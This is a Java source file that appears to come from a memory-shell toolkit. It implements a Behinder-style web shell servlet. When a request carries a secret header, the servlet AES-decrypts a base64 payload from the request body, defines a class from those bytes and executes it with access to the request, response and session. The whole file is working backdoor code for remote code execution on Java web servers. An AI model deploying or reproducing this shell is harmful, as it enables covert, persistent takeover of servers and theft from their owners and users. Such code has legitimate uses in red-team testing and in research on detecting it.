package com.reajason.javaweb.memshell.shelltool.behinder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderServlet extends ClassLoader implements Servlet {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    public BehinderServlet() {
    }

    public BehinderServlet(ClassLoader parent) {
        super(parent);
    }

    @Override
    @SuppressWarnings("all")
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);
                obj.put("response", unwrap(response));
                obj.put("session", session);
                session.setAttribute("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(base64Decode(req.getReader().readLine()));
                Object instance = new BehinderServlet(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(obj);
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj) {
        try {
            return getFieldValue(obj, "response");
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException();
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {
    }

    @Override
    public void init(ServletConfig config) throws ServletException {
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }
}
